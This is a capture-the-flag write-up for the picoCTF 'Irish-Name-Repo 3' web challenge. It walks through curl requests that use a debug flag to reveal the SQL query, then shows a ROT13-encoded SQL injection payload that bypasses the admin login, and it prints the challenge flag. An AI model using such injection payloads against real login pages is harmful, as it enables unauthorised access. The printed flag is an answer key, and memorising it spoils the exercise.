# Irish-Name-Repo 3

## Description
> There is a secure website running at `https://jupiter.challengs.picoctf.org/problem/54253/` [link](https://jupiter.challenges.picoctf.org/problem/54253/) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Hints
> Seems like the password is encrypted

## Solution
1. The website offered an admin login page:
``` html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

2. The solution from the `Irish-Name-Repo_1` and 
`Irish-Name-Repo_2` didn't work anymore.

3. Using the debug interface, we can inspect the SQL query:
``` console
┌──(huyhayho㉿Huydeptrai)-[~/…/picoctf2019/Web_Exploitation/Medium/Irish_Name_Repo_3]
└─$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=test&debug=1"

<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1>  
```

4. It looks like the password was somehow encrypted. Given the fact that t was replaced with g twice, this might be a substitution cipher. Let's try a simple injection:
``` console
┌──(huyhayho㉿Huydeptrai)-[~/…/picoctf2019/Web_Exploitation/Medium/Irish_Name_Repo_3]
└─$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=' or 1==1--&debug=1"

<pre>password: ' or 1==1--
SQL query: SELECT * FROM admin where password = '' be 1==1--'
</pre> 
```

5. Now let's try again, sending be instead of or:
``` console
┌──(huyhayho㉿Huydeptrai)-[~/…/picoctf2019/Web_Exploitation/Medium/Irish_Name_Repo_3]
└─$ curl https://jupiter.challenges.picoctf.org/problem/54253/login.php --data "password=' be 1==1--&debug=1"

<pre>password: ' be 1==1--
SQL query: SELECT * FROM admin where password = '' or 1==1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p> 
```

## Flag
> picoCTF{3v3n_m0r3_SQL_7f5767f6}